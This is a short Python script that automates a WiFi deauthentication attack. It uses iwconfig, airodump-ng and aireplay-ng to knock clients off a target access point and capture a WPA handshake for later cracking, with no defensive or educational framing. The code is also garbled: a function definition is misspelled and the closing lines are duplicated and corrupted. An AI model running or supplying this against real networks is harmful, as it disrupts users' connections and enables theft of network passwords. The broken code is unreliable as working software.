import subprocess
import time
import os


def run_deauth_attack(interface, target):
    if not target:
        print("[!] No target specified.")
        return


    bssid = target["BSSID"]
    channel = target["channel"]


    print(f"[*] Setting {interface} to channel {channel}...")
    subprocess.run(["iwconfig", interface, "channel", channel], stdout=subprocess.DEVNULL)


    cap_file = "handshake"
    print("[*] Starting capture...")
    capture_proc = subprocess.Popen([
        "airodump-ng",
        "-c", channel,
        "--bssid", bssid,
        "-w", cap_file,
        interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


    time.sleep(2)
    print(f"[*] Sending deauth packets to {bssid}...")
    try:
        while not handshake_captured(cap_file + "-01.cap"):
            subprocess.run([
                "aireplay-ng",
                "--deauth", "10",
                "-a", bssid,
                interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
    except KeyboardInterrupt:
        print("[!] Interrupted by user.")


    print("[+] Handshake captured. Stopping capture...")
    capture_proc.terminate()
    capture_proc.wait()


    print("[+] Capture complete: handshake-01.cap")


ef handshake_captured(cap_file):
    try:
        result = subprocess.run([
            "aircrack-ng", cap_file
        ], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)


        return "WPA handshake" in result.stdout
    except Exception as e:
        print(f"[!] Error checking handshake: {e}")
        return Falser checking handshake: {e}")
        return False